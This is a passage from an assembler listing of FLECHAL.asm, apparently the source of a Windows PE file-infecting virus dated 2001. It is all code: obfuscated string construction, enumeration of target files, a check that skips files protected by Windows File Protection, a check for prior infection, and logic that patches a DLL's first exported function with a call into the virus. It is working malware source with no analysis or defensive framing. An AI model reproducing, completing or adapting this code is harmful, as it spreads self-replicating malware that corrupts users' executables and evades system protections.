    736					    x_push eax,	CloseTmTable~
1   737								 x_push_first eax
2   738	00000359  33 C0						 xor	 eax, eax
3   739									 x_push_next q,eax,j
4   740	0000035B  2D 87868600					 sub	 eax, _reg - j
4   741	00000360  50						 push	 eax
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 14
FLECHAL.asm



3   742									 x_push_next q,eax,j
4   743	00000361  35 1D151861					 xor	 eax, _reg xor j
4   744	00000366  50						 push	 eax
3   745									 x_push_next q,eax,j
4   746	00000367  05 EF00F204					 add	 eax, j	- _reg
4   747	0000036C  50						 push	 eax
3   748									 x_push_next q,eax,j
4   749	0000036D  35 27023826					 xor	 eax, _reg xor j
4   750	00000372  50						 push	 eax
1   751	00000373  8B C4						 mov eax, esp
    752	00000375  50			    push eax
    753	00000376  FF 35	00000108r	    push hWnd_tmapi
    754					    callx GetProcAddress
1   755	0000037C  E8 00000000e		    call GetProcAddress
    756					    x_pop
1   757	00000381  8D 64	24 10					 lea	 esp, [esp + _xsize]
    758
    759	00000385  A3 00000114r		    mov	CloseTmTable, eax
    760
    761	0000038A  85 C0			    test eax, eax
    762	0000038C  0F 84	000000AA	    jz _unloadtmapi
    763
    764	00000392  60			    pushad
    765					    x_push eax,	TMAPI.DLL|LOADED~
1   766								 x_push_first eax
2   767	00000393  33 C0						 xor	 eax, eax
3   768									 x_push_next q,eax,j
4   769	00000395  2D 87868600					 sub	 eax, _reg - j
4   770	0000039A  50						 push	 eax
3   771									 x_push_next q,eax,j
4   772	0000039B  35 3C3C3E41					 xor	 eax, _reg xor j
4   773	000003A0  50						 push	 eax
3   774									 x_push_next q,eax,j
4   775	000003A1  05 0B06DC0B					 add	 eax, j	- _reg
4   776	000003A6  50						 push	 eax
3   777									 x_push_next q,eax,j
4   778	000003A7  35 03080E05					 xor	 eax, _reg xor j
4   779	000003AC  50						 push	 eax
3   780									 x_push_next q,eax,j
4   781	000003AD  2D FC02E0F5					 sub	 eax, _reg - j
4   782	000003B2  50						 push	 eax
1   783	000003B3  8B C4						 mov eax, esp
    784	000003B5  6A 00	50 50 6A 00	    push 0 eax eax 0
    785	000003BB  FF 15	00002EBCr	    call [MessageBoxA]
    786					    x_pop
1   787	000003C1  8D 64	24 14					 lea	 esp, [esp + _xsize]
    788	000003C5  61			    popad
    789
    790	000003C6  C7 05	000003E0r     +	    mov	index_tm, NULL
    791		  00000000
    792
    793	000003D0  FF 15	0000010Cr	    call InitTmTable
    794
    795	000003D6  81 EC	00000104	    sub	esp, MAX_PATH
    796	000003DC  8B DC			    mov	ebx, esp
    797
    798	000003DE			    _search_via_tmapi:
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 15
FLECHAL.asm



    799
    800	000003DE  53			    push ebx
    801	000003DF  68 12345678		    push 12345678h
    802		  =FLAT:03E0		    index_tm equ dword ptr $-4
    803	000003E4  FF 15	00000110r	    call GetTmElementByIndex
    804
    805	000003EA  FF 05	000003E0r	    inc	index_tm
    806
    807	000003F0  85 C0			    test eax, eax
    808	000003F2  74 08			    jz _search_end
    809
    810					    ; infection	routine	here
    811
    812	000003F4  53			    push ebx
    813	000003F5  E8 0000007C		    call _infect
    814
    815	000003FA  EB E2			    jmp	_search_via_tmapi
    816
    817	000003FC			    _search_end:
    818
    819	000003FC  FF 15	00000114r	    call CloseTmTable
    820
    821	00000402  60			    pushad
    822					    x_push eax,	TMAPI.DLL|UNLOAD~
1   823								 x_push_first eax
2   824	00000403  33 C0						 xor	 eax, eax
3   825									 x_push_next q,eax,j
4   826	00000405  2D 87868600					 sub	 eax, _reg - j
4   827	0000040A  50						 push	 eax
3   828									 x_push_next q,eax,j
4   829	0000040B  35 3C38354C					 xor	 eax, _reg xor j
4   830	00000410  50						 push	 eax
3   831									 x_push_next q,eax,j
4   832	00000411  05 0A13D100					 add	 eax, j	- _reg
4   833	00000416  50						 push	 eax
3   834									 x_push_next q,eax,j
4   835	00000417  35 02110E05					 xor	 eax, _reg xor j
4   836	0000041C  50						 push	 eax
3   837									 x_push_next q,eax,j
4   838	0000041D  2D FC02E0F5					 sub	 eax, _reg - j
4   839	00000422  50						 push	 eax
1   840	00000423  8B C4						 mov eax, esp
    841	00000425  6A 00	50 50 6A 00	    push 0 eax eax 0
    842	0000042B  FF 15	00002EBCr	    call [MessageBoxA]
    843					    x_pop
1   844	00000431  8D 64	24 14					 lea	 esp, [esp + _xsize]
    845	00000435  61			    popad
    846
    847	00000436  81 EC	FFFFFEFC	    sub	esp, - MAX_PATH
    848
    849	0000043C			    _unloadtmapi:
    850
    851	0000043C  FF 35	00000108r	    push hWnd_tmapi
    852					    callx FreeLibrary
1   853	00000442  E8 00000000e		    call FreeLibrary
    854
    855	00000447			    _out_tmapi:
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 16
FLECHAL.asm



    856
    857	00000447  E9 FFFFFDA5		    jmp	_exit
    858
    859	0000044C			    _openmutex:
    860
    861					    x_push eax,	_flechal1.0~
1   862								 x_push_first eax
2   863	0000044C  33 C0						 xor	 eax, eax
3   864									 x_push_next q,eax,j
4   865	0000044E  2D FFCFD1CF					 sub	 eax, _reg - j
4   866	00000453  50						 push	 eax
3   867									 x_push_next q,eax,j
4   868	00000454  35 6C514652					 xor	 eax, _reg xor j
4   869	00000459  50						 push	 eax
3   870									 x_push_next q,eax,j
4   871	0000045A  05 F90AFDFC					 add	 eax, j	- _reg
4   872	0000045F  50						 push	 eax
1   873	00000460  8B C4						 mov eax, esp
    874	00000462  50			    push eax
    875	00000463  6A 01			    push TRUE
    876	00000465  68 00100000		    push 00100000h
    877					    callx OpenMutexA
1   878	0000046A  E8 00000000e		    call OpenMutexA
    879					    x_pop
1   880	0000046F  8D 64	24 0C					 lea	 esp, [esp + _xsize]
    881
    882	00000473  85 C0			    test eax, eax
    883	00000475  C3			    ret
    884
    885	00000476			    _infect:
    886
    887	00000476  55			    push ebp
    888	00000477  8B EC			    mov	ebp, esp
    889	00000479  60			    pushad
    890
    891	0000047A  8B 45	08		    mov	eax, [ebp+8]  ;	 filename
    892	0000047D  A3 00000F19r		    mov	_current_fname,	eax
    893	00000482  C7 05	000006FCr     +	    mov	_sfc_flag, -1
    894		  FFFFFFFF
    895
    896	0000048C  E8 000024F9		    call rnd_eax
    897	00000491  A3 00002DF7r		    mov	_loader_fixed_random_value, eax
    898
    899	00000496  60			    pushad
    900	00000497  6A 00			    push 0
    901	00000499  FF 35	00000F19r	    push _current_fname
    902	0000049F  FF 35	00000F19r	    push _current_fname
    903	000004A5  6A 00			    push 0
    904	000004A7  FF 15	00002EBCr	    call [MessageBoxA]
    905	000004AD  61			    popad
    906
    907	000004AE  FF 35	00000F19r	    push _current_fname
    908	000004B4  E8 00000C40		    call _open_read
    909
    910	000004B9  85 C0			    test eax, eax
    911	000004BB  0F 84	00000A1F	    jz _infect_end
    912
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 17
FLECHAL.asm



    913	000004C1  8B F8			    mov	edi, eax
    914
    915	000004C3  81 3D	0000013Cr     +	    cmp	_file_size, 1024 * 24
    916		  00006000
    917	000004CD  0F 82	00000A02	    jb _infect_end_1
    918
    919	000004D3  81 3D	0000013Cr     +	    cmp	_file_size, 1024 * 2400
    920		  00258000
    921	000004DD  0F 87	000009F2	    ja _infect_end_1
    922
    923					    x_push eax,	IMAGEHLP.DLL~
1   924								 x_push_first eax
2   925	000004E3  33 C0						 xor	 eax, eax
3   926									 x_push_next q,eax,j
4   927	000004E5  2D 87868600					 sub	 eax, _reg - j
4   928	000004EA  50						 push	 eax
3   929									 x_push_next q,eax,j
4   930	000004EB  35 34353E2E					 xor	 eax, _reg xor j
4   931	000004F0  50						 push	 eax
3   932									 x_push_next q,eax,j
4   933	000004F1  05 04000417					 add	 eax, j	- _reg
4   934	000004F6  50						 push	 eax
3   935									 x_push_next q,eax,j
4   936	000004F7  35 170D050C					 xor	 eax, _reg xor j
4   937	000004FC  50						 push	 eax
1   938	000004FD  8B C4						 mov eax, esp
    939	000004FF  50			    push eax
    940					    callx LoadLibraryA
1   941	00000500  E8 00000000e		    call LoadLibraryA
    942					    x_pop
1   943	00000505  8D 64	24 10					 lea	 esp, [esp + _xsize]
    944
    945	00000509  A3 00000154r		    mov	hWnd_imagehlp, eax
    946
    947	0000050E  85 C0			    test eax, eax
    948	00000510  0F 84	000009BF	    jz _infect_end_1
    949
    950					    x_push eax,	ImageNtHeader~
1   951								 x_push_first eax
2   952	00000516  33 C0						 xor	 eax, eax
3   953									 x_push_next q,eax,j
4   954	00000518  2D 8786FF8E					 sub	 eax, _reg - j
4   955	0000051D  50						 push	 eax
3   956									 x_push_next q,eax,j
4   957	0000051E  35 1D1D6117					 xor	 eax, _reg xor j
4   958	00000523  50						 push	 eax
3   959									 x_push_next q,eax,j
4   960	00000524  05 E30FED00					 add	 eax, j	- _reg
4   961	00000529  50						 push	 eax
3   962									 x_push_next q,eax,j
4   963	0000052A  35 2F15232C					 xor	 eax, _reg xor j
4   964	0000052F  50						 push	 eax
1   965	00000530  8B C4						 mov eax, esp
    966	00000532  50			    push eax
    967	00000533  FF 35	00000154r	    push hWnd_imagehlp
    968					    callx GetProcAddress
1   969	00000539  E8 00000000e		    call GetProcAddress
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 18
FLECHAL.asm



    970					    x_pop
1   971	0000053E  8D 64	24 10					 lea	 esp, [esp + _xsize]
    972
    973	00000542  A3 00000158r		    mov	ImageNtHeader, eax
    974
    975	00000547  85 C0			    test eax, eax
    976	00000549  0F 84	0000097B	    jz _infect_end_2
    977
    978					    x_push eax,	ImageRvaToSection~
1   979								 x_push_first eax
2   980	0000054F  33 C0						 xor	 eax, eax
3   981									 x_push_next q,eax,j
4   982	00000551  2D 8786FF92					 sub	 eax, _reg - j
4   983	00000556  50						 push	 eax
3   984									 x_push_next q,eax,j
4   985	00000557  35 1710740D					 xor	 eax, _reg xor j
4   986	0000055C  50						 push	 eax
3   987									 x_push_next q,eax,j
4   988	0000055D  05 F5E9FAF1					 add	 eax, j	- _reg
4   989	00000562  50						 push	 eax
3   990									 x_push_next q,eax,j
4   991	00000563  35 04253D31					 xor	 eax, _reg xor j
4   992	00000568  50						 push	 eax
3   993									 x_push_next q,eax,j
4   994	00000569  2D FA14E51C					 sub	 eax, _reg - j
4   995	0000056E  50						 push	 eax
1   996	0000056F  8B C4						 mov eax, esp
    997	00000571  50			    push eax
    998	00000572  FF 35	00000154r	    push hWnd_imagehlp
    999					    callx GetProcAddress
1  1000	00000578  E8 00000000e		    call GetProcAddress
   1001					    x_pop
1  1002	0000057D  8D 64	24 14					 lea	 esp, [esp + _xsize]
   1003
   1004	00000581  A3 0000015Cr		    mov	ImageRvaToSection, eax
   1005
   1006	00000586  85 C0			    test eax, eax
   1007	00000588  0F 84	0000093C	    jz _infect_end_2
   1008
   1009					    x_push eax,	ImageRvaToVa~
1  1010								 x_push_first eax
2  1011	0000058E  33 C0						 xor	 eax, eax
3  1012									 x_push_next q,eax,j
4  1013	00000590  2D 87868600					 sub	 eax, _reg - j
4  1014	00000595  50						 push	 eax
3  1015									 x_push_next q,eax,j
4  1016	00000596  35 192F1554					 xor	 eax, _reg xor j
4  1017	0000059B  50						 push	 eax
3  1018									 x_push_next q,eax,j
4  1019	0000059C  05 001FE311					 add	 eax, j	- _reg
4  1020	000005A1  50						 push	 eax
3  1021									 x_push_next q,eax,j
4  1022	000005A2  35 06173F2C					 xor	 eax, _reg xor j
4  1023	000005A7  50						 push	 eax
1  1024	000005A8  8B C4						 mov eax, esp
   1025	000005AA  50			    push eax
   1026	000005AB  FF 35	00000154r	    push hWnd_imagehlp
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 19
FLECHAL.asm



   1027					    callx GetProcAddress
1  1028	000005B1  E8 00000000e		    call GetProcAddress
   1029					    x_pop
1  1030	000005B6  8D 64	24 10					 lea	 esp, [esp + _xsize]
   1031
   1032	000005BA  A3 00000160r		    mov	ImageRvaToVa, eax
   1033
   1034	000005BF  85 C0			    test eax, eax
   1035	000005C1  0F 84	00000903	    jz _infect_end_2
   1036
   1037	000005C7  60			    pushad
   1038					    x_push eax,	IMAGEHLP.DLL|LOADED~
1  1039								 x_push_first eax
2  1040	000005C8  33 C0						 xor	 eax, eax
3  1041									 x_push_next q,eax,j
4  1042	000005CA  2D FFBBBABC					 sub	 eax, _reg - j
4  1043	000005CF  50						 push	 eax
3  1044									 x_push_next q,eax,j
4  1045	000005D0  35 410B0964					 xor	 eax, _reg xor j
4  1046	000005D5  50						 push	 eax
3  1047									 x_push_next q,eax,j
4  1048	000005D6  05 0AFCF80E					 add	 eax, j	- _reg
4  1049	000005DB  50						 push	 eax
3  1050									 x_push_next q,eax,j
4  1051	000005DC  35 1C000C6B					 xor	 eax, _reg xor j
4  1052	000005E1  50						 push	 eax
3  1053									 x_push_next q,eax,j
4  1054	000005E2  2D 090AFAFC					 sub	 eax, _reg - j
4  1055	000005E7  50						 push	 eax
1  1056	000005E8  8B C4						 mov eax, esp
   1057	000005EA  6A 00	50 50 6A 00	    push 0 eax eax 0
   1058	000005F0  FF 15	00002EBCr	    call [MessageBoxA]
   1059					    x_pop
1  1060	000005F6  8D 64	24 14					 lea	 esp, [esp + _xsize]
   1061	000005FA  61			    popad
   1062
   1063	000005FB  57			    push edi
   1064	000005FC  FF 15	00000158r	    call ImageNtHeader
   1065
   1066	00000602  A3 00000164r		    mov	_image_nt_headers, eax
   1067
   1068	00000607  85 C0			    test eax, eax
   1069	00000609  0F 84	000008BB	    jz _infect_end_2
   1070
   1071	0000060F  8B F0			    mov	esi, eax
   1072
   1073					    ; GET GetProcAddress, GetModuleHandle/LoadLibrary import addresses
   1074					    ; if not found, skip infection
   1075
   1076	00000611  E8 00000CD7		    call locate_import
   1077	00000616  0F 84	000008AE	    jz _infect_end_2
   1078
   1079	0000061C  60			    pushad
   1080					    x_push eax,	PE_IMAGE_FOUND~
1  1081								 x_push_first eax
2  1082	0000061D  33 C0						 xor	 eax, eax
3  1083									 x_push_next q,eax,j
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 20
FLECHAL.asm



4  1084	0000061F  2D 87FFBBB2					 sub	 eax, _reg - j
4  1085	00000624  50						 push	 eax
3  1086									 x_push_next q,eax,j
4  1087	00000625  35 2D4F0211					 xor	 eax, _reg xor j
4  1088	0000062A  50						 push	 eax
3  1089									 x_push_next q,eax,j
4  1090	0000062B  05 EFF7FAEE					 add	 eax, j	- _reg
4  1091	00000630  50						 push	 eax
3  1092									 x_push_next q,eax,j
4  1093	00000631  35 0C18041D					 xor	 eax, _reg xor j
4  1094	00000636  50						 push	 eax
1  1095	00000637  8B C4						 mov eax, esp
   1096	00000639  6A 00	50 50 6A 00	    push 0 eax eax 0
   1097	0000063F  FF 15	00002EBCr	    call [MessageBoxA]
   1098					    x_pop
1  1099	00000645  8D 64	24 10					 lea	 esp, [esp + _xsize]
   1100	00000649  61			    popad
   1101
   1102	0000064A  FF 76	28		    push [esi.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint]
   1103	0000064D  8F 05	00000168r	    pop	_infect_entry_point
   1104
   1105	00000653  FF 35	00000168r	    push _infect_entry_point
   1106	00000659  57			    push edi
   1107	0000065A  FF 35	00000164r	    push _image_nt_headers
   1108	00000660  FF 15	0000015Cr	    call ImageRvaToSection
   1109
   1110	00000666  85 C0			    test eax, eax
   1111	00000668  74 0E			    jz .2
   1112
   1113	0000066A  50			    push eax
   1114	0000066B  E8 000008C6		    call _check_know_section
   1115	00000670  0F 85	00000854	    jnz	_infect_end_2
   1116
   1117	00000676  2B C7			    sub	eax, edi
   1118
   1119	00000678			    .2:
   1120
   1121	00000678  A3 0000016Cr		    mov	_infect_EP_section, eax
   1122
   1123					    ;  sfc ?
   1124
   1125					    x_push eax,	SFC.DLL~
1  1126								 x_push_first eax
2  1127	0000067D  33 C0						 xor	 eax, eax
3  1128									 x_push_next q,eax,j
4  1129	0000067F  2D FFB3B3BC					 sub	 eax, _reg - j
4  1130	00000684  50						 push	 eax
3  1131									 x_push_next q,eax,j
4  1132	00000685  35 2E0F0A17					 xor	 eax, _reg xor j
4  1133	0000068A  50						 push	 eax
1  1134	0000068B  8B C4						 mov eax, esp
   1135	0000068D  50			    push eax
   1136					    callx LoadLibraryA
1  1137	0000068E  E8 00000000e		    call LoadLibraryA
   1138					    x_pop
1  1139	00000693  8D 64	24 08					 lea	 esp, [esp + _xsize]
   1140
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 21
FLECHAL.asm



   1141	00000697  A3 000001A4r		    mov	hWnd_sfc, eax
   1142
   1143	0000069C  85 C0			    test eax, eax
   1144	0000069E  74 59			    jz _no_sfc
   1145
   1146					    x_push eax,	SfcIsFileProtected~
1  1147								 x_push_first eax
2  1148	000006A0  33 C0						 xor	 eax, eax
3  1149									 x_push_next q,eax,j
4  1150	000006A2  2D 87FF9B9B					 sub	 eax, _reg - j
4  1151	000006A7  50						 push	 eax
3  1152									 x_push_next q,eax,j
4  1153	000006A8  35 0C630111					 xor	 eax, _reg xor j
4  1154	000006AD  50						 push	 eax
3  1155									 x_push_next q,eax,j
4  1156	000006AE  05 FB0EEAF1					 add	 eax, j	- _reg
4  1157	000006B3  50						 push	 eax
3  1158									 x_push_next q,eax,j
4  1159	000006B4  35 031B1616					 xor	 eax, _reg xor j
4  1160	000006B9  50						 push	 eax
3  1161									 x_push_next q,eax,j
4  1162	000006BA  2D 2305E020					 sub	 eax, _reg - j
4  1163	000006BF  50						 push	 eax
1  1164	000006C0  8B C4						 mov eax, esp
   1165	000006C2  50			    push eax
   1166	000006C3  FF 35	000001A4r	    push hWnd_sfc
   1167					    callx GetProcAddress
1  1168	000006C9  E8 00000000e		    call GetProcAddress
   1169					    x_pop
1  1170	000006CE  8D 64	24 14					 lea	 esp, [esp + _xsize]
   1171
   1172	000006D2  A3 000001A8r		    mov	SfcIsFileProtected, eax
   1173
   1174	000006D7  85 C0			    test eax, eax
   1175	000006D9  74 13			    jz _unload_sfc
   1176
   1177	000006DB  FF 35	00000F19r	    push _current_fname
   1178	000006E1  6A 00			    push NULL
   1179	000006E3  FF 15	000001A8r	    call SfcIsFileProtected
   1180
   1181	000006E9  A3 000006FCr		    mov	_sfc_flag, eax
   1182
   1183	000006EE			    _unload_sfc:
   1184
   1185	000006EE  FF 35	000001A4r	    push hWnd_sfc
   1186					    callx FreeLibrary
1  1187	000006F4  E8 00000000e		    call FreeLibrary
   1188
   1189	000006F9			    _no_sfc:
   1190
   1191	000006F9  2B C0			    sub	eax, eax
   1192
   1193	000006FB  3D 12345678		    cmp	eax, 12345678h
   1194		  =FLAT:06FC		    _sfc_flag equ dword	ptr $-4
   1195	00000700  0F 84	000007C4	    je _infect_end_2
   1196
   1197	00000706  60			    pushad
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 22
FLECHAL.asm



   1198					    x_push eax,	SFC|OK~
1  1199								 x_push_first eax
2  1200	00000707  33 C0						 xor	 eax, eax
3  1201									 x_push_next q,eax,j
4  1202	00000709  2D 87FFB4B1					 sub	 eax, _reg - j
4  1203	0000070E  50						 push	 eax
3  1204									 x_push_next q,eax,j
4  1205	0000070F  35 58430D1C					 xor	 eax, _reg xor j
4  1206	00000714  50						 push	 eax
1  1207	00000715  8B C4						 mov eax, esp
   1208	00000717  6A 00	50 50 6A 00	    push 0 eax eax 0
   1209	0000071D  FF 15	00002EBCr	    call [MessageBoxA]
   1210					    x_pop
1  1211	00000723  8D 64	24 08					 lea	 esp, [esp + _xsize]
   1212	00000727  61			    popad
   1213
   1214					    ;  saving usefull fields...
   1215
   1216	00000728  E8 0000098C		    call _biggest_rva
   1217	0000072D  0F 84	00000797	    jz _infect_end_2
   1218
   1219	00000733  50			    push eax
   1220	00000734  57			    push edi
   1221	00000735  FF 35	00000164r	    push _image_nt_headers
   1222	0000073B  FF 15	0000015Cr	    call ImageRvaToSection
   1223
   1224	00000741  85 C0			    test eax, eax
   1225	00000743  0F 84	00000781	    jz _infect_end_2
   1226
   1227	00000749  50			    push eax
   1228
   1229	0000074A  2B C7			    sub	eax, edi
   1230	0000074C  A3 00000188r		    mov	_infect_last_section, eax
   1231
   1232	00000751  E8 000007E0		    call _check_know_section
   1233	00000756  0F 85	0000076E	    jnz	_infect_end_2
   1234
   1235					    ;  rva
   1236
   1237	0000075C  8B 0D	00000188r	    mov	ecx, _infect_last_section
   1238	00000762  03 CF			    add	ecx, edi
   1239
   1240					    ;  CHANGES ON INFECTION TYPEs
   1241
   1242	00000764  FF 71	0C		    push [ecx.SH_VirtualAddress]
   1243	00000767  8F 05	00002D91r	    pop	_loader_memory_protect?
   1244
   1245	0000076D  8B 41	08		    mov	eax, [ecx.SH_VirtualSize]
   1246	00000770  3B 41	10		    cmp	eax, [ecx.SH_SizeOfRawData]
   1247	00000773  77 03			    ja .8
   1248	00000775  8B 41	10		    mov	eax, [ecx.SH_SizeOfRawData]
   1249
   1250	00000778			    .8:
   1251
   1252	00000778  A3 0000018Cr		    mov	_infect_flechal_rva, eax
   1253	0000077D  A3 000001A0r		    mov	_infect_virtual_raw, eax
   1254
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 23
FLECHAL.asm



   1255	00000782  85 C0			    test eax, eax
   1256	00000784  0F 84	00000740	    jz _infect_end_2
   1257
   1258	0000078A  8B 41	14		    mov	eax, [ecx.SH_PointerToRawData]
   1259	0000078D  01 05	0000018Cr	    add	_infect_flechal_rva, eax
   1260
   1261	00000793  85 C0			    test eax, eax
   1262	00000795  0F 84	0000072F	    jz _infect_end_2
   1263
   1264	0000079B  A1 0000018Cr		    mov	eax, _infect_flechal_rva
   1265
   1266					    ;  if our RVA is very different from the original file size	(plus than 4 Kb), we should +
   1267					 avoid this infection
   1268					    ;  maybe this file is infected by another virus
   1269
   1270	000007A0  8B 0D	0000013Cr	    mov	ecx, _file_size
   1271	000007A6  3B C1			    cmp	eax, ecx
   1272	000007A8  77 01			    ja .16
   1273
   1274	000007AA  91			    xchg eax, ecx
   1275
   1276	000007AB			    .16:
   1277
   1278	000007AB  2B C1			    sub	eax, ecx
   1279	000007AD  3D 00001000		    cmp	eax, 1024 * 4
   1280	000007B2  0F 87	00000712	    ja _infect_end_2
   1281
   1282
   1283					    ;  export directory	?
   1284
   1285	000007B8  8B 0D	00000164r	    mov	ecx, _image_nt_headers
   1286
   1287	000007BE  FF 71	7C		    push [ecx.IMAGE_NT_HEADERS.OptionalHeader.DataDirectory\
   1288					    .(SIZE IMAGE_DATA_DIRECTORY*IMAGE_DIRECTORY_ENTRY_EXPORT).isize]
   1289	000007C1  8F 05	00000178r	    pop	_infect_export_sz
   1290
   1291	000007C7  8B 41	78		    mov	eax, [ecx.IMAGE_NT_HEADERS.OptionalHeader.DataDirectory\
   1292					    .(SIZE IMAGE_DATA_DIRECTORY*IMAGE_DIRECTORY_ENTRY_EXPORT)\
   1293					    .VirtualAddress]
   1294	000007CA  A3 00000170r		    mov	_infect_export_dir_rva,	eax
   1295
   1296	000007CF  85 C0			    test eax, eax
   1297	000007D1  0F 84	000004A4	    jz _no_export
   1298
   1299	000007D7  60			    pushad
   1300					    x_push eax,	EXPORT_DIRECTORY_FOUND~
1  1301								 x_push_first eax
2  1302	000007D8  33 C0						 xor	 eax, eax
3  1303									 x_push_next q,eax,j
4  1304	000007DA  2D 87FFBBB2					 sub	 eax, _reg - j
4  1305	000007DF  50						 push	 eax
3  1306									 x_push_next q,eax,j
4  1307	000007E0  35 2D4F0211					 xor	 eax, _reg xor j
4  1308	000007E5  50						 push	 eax
3  1309									 x_push_next q,eax,j
4  1310	000007E6  05 040308F5					 add	 eax, j	- _reg
4  1311	000007EB  50						 push	 eax
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 24
FLECHAL.asm



3  1312									 x_push_next q,eax,j
4  1313	000007EC  35 1A171D1D					 xor	 eax, _reg xor j
4  1314	000007F1  50						 push	 eax
3  1315									 x_push_next q,eax,j
4  1316	000007F2  2D FEE5FDF7					 sub	 eax, _reg - j
4  1317	000007F7  50						 push	 eax
3  1318									 x_push_next q,eax,j
4  1319	000007F8  35 0B0F0C17					 xor	 eax, _reg xor j
4  1320	000007FD  50						 push	 eax
1  1321	000007FE  8B C4						 mov eax, esp
   1322	00000800  6A 00	50 50 6A 00	    push 0 eax eax 0
   1323	00000806  FF 15	00002EBCr	    call [MessageBoxA]
   1324					    x_pop
1  1325	0000080C  8D 64	24 18					 lea	 esp, [esp + _xsize]
   1326	00000810  61			    popad
   1327
   1328	00000811  83 3D	00000168r 00	    cmp	_infect_entry_point, 0
   1329	00000818  0F 85	000002A1	    jnz	_valid_entry_point
   1330
   1331					    ;  export directory	found
   1332					    ;  sfc protection not found
   1333					    ;  no entry-point (probably	.DLL file)
   1334
   1335					    ;  we've to	try to infect the first	exported
   1336					    ;  function	(replacing 5 first bytes by a "CALL VIRUS")
   1337
   1338					    ;  infection flag -	0
   1339
   1340	0000081E  90			    nop
   1341
   1342	0000081F  C6 05	00002B34r 00	    mov	_infect_mode_1,	0
   1343
   1344	00000826  60			    pushad
   1345					    x_push eax,	INFECT|MD|0~
1  1346								 x_push_first eax
2  1347	00000827  33 C0						 xor	 eax, eax
3  1348									 x_push_next q,eax,j
4  1349	00000829  2D FFCFDFBC					 sub	 eax, _reg - j
4  1350	0000082E  50						 push	 eax
3  1351									 x_push_next q,eax,j
4  1352	0000082F  35 4D107407					 xor	 eax, _reg xor j
4  1353	00000834  50						 push	 eax
3  1354									 x_push_next q,eax,j
4  1355	00000835  05 F825FA06					 add	 eax, j	- _reg
4  1356	0000083A  50						 push	 eax
1  1357	0000083B  8B C4						 mov eax, esp
   1358	0000083D  6A 00	50 50 6A 00	    push 0 eax eax 0
   1359	00000843  FF 15	00002EBCr	    call [MessageBoxA]
   1360					    x_pop
1  1361	00000849  8D 64	24 0C					 lea	 esp, [esp + _xsize]
   1362	0000084D  61			    popad
   1363
   1364	0000084E  FF 35	00000170r	    push _infect_export_dir_rva
   1365	00000854  E8 00000807		    call _rva_to_va
   1366
   1367	00000859  A3 0000017Cr		    mov	_infect_export_dir_va, eax
   1368
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 25
FLECHAL.asm



   1369	0000085E  85 C0			    test eax, eax
   1370	00000860  0F 84	00000664	    jz _infect_end_2
   1371
   1372	00000866  91			    xchg ecx, eax
   1373	00000867  8B 41	14		    mov	eax, [ecx.IMAGE_EXPORT_DIRECTORY.NumberOfFunctions]
   1374
   1375	0000086A  85 C0			    test eax, eax
   1376	0000086C  0F 84	00000658	    jz _infect_end_2
   1377
   1378	00000872  FF 71	20		    push [ecx.IMAGE_EXPORT_DIRECTORY.AddressOfNames]
   1379	00000875  E8 000007E6		    call _rva_to_va
   1380
   1381	0000087A  85 C0			    test eax, eax
   1382	0000087C  0F 84	00000648	    jz _infect_end_2
   1383
   1384					    ;  get first one
   1385
   1386	00000882  FF 30			    push dword ptr [eax]
   1387	00000884  E8 000007D7		    call _rva_to_va
   1388
   1389					    ;  name of function	in EAX
   1390
   1391	00000889  A3 00000180r		    mov	_infect_export_names, eax
   1392
   1393	0000088E  85 C0			    test eax, eax
   1394	00000890  0F 84	00000634	    jz _infect_end_2
   1395
   1396	00000896  60			    pushad
   1397	00000897  6A 00	50 50 6A 00	    push 0 eax eax 0
   1398	0000089D  FF 15	00002EBCr	    call [MessageBoxA]
   1399	000008A3  61			    popad
   1400
   1401	000008A4  50			    push eax
   1402					    callx lstrlenA
1  1403	000008A5  E8 00000000e		    call lstrlenA
   1404
   1405					    ;  Is this a valid function	?
   1406
   1407	000008AA  85 C0			    test eax, eax
   1408	000008AC  0F 84	00000618	    jz _infect_end_2
   1409
   1410					    ;  load this file/library...
   1411
   1412	000008B2  FF 35	00000F19r	    push _current_fname
   1413					    callx LoadLibraryA
1  1414	000008B8  E8 00000000e		    call LoadLibraryA
   1415
   1416	000008BD  85 C0			    test eax, eax
   1417	000008BF  0F 84	00000605	    jz _infect_end_2
   1418
   1419	000008C5  A3 000001ACr		    mov	hWnd_file_infect, eax
   1420
   1421	000008CA  FF 35	00000180r	    push _infect_export_names
   1422	000008D0  FF 35	000001ACr	    push hWnd_file_infect
   1423					    callx GetProcAddress
1  1424	000008D6  E8 00000000e		    call GetProcAddress
   1425
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 26
FLECHAL.asm



   1426	000008DB  85 C0			    test eax, eax
   1427	000008DD  0F 84	000005DC	    jz _infect_end_3
   1428
   1429	000008E3  3B 05	000001ACr	    cmp	eax, hWnd_file_infect
   1430	000008E9  0F 82	000005D0	    jb _infect_end_3
   1431
   1432	000008EF  2B 05	000001ACr	    sub	eax, hWnd_file_infect
   1433	000008F5  A3 00000190r		    mov	_infect_lib_rva, eax
   1434
   1435	000008FA  50			    push eax
   1436	000008FB  57			    push edi
   1437	000008FC  FF 35	00000164r	    push _image_nt_headers
   1438	00000902  FF 15	0000015Cr	    call ImageRvaToSection
   1439
   1440	00000908  85 C0			    test eax, eax
   1441	0000090A  0F 84	000005AF	    jz _infect_end_3
   1442
   1443	00000910  FF 70	08		    push [eax.SH_VirtualSize]
   1444	00000913  8F 05	00002C18r	    pop	_replaced_api_section_sz
   1445
   1446	00000919  FF 70	0C		    push [eax.SH_VirtualAddress]
   1447	0000091C  8F 05	00002D89r	    pop	_replaced_api_section
   1448
   1449	00000922  50			    push eax
   1450	00000923  E8 0000060E		    call _check_know_section
   1451	00000928  0F 85	00000591	    jnz	_infect_end_3
   1452
   1453					    ;  VA to function in EAX
   1454
   1455	0000092E  FF 35	00000190r	    push _infect_lib_rva
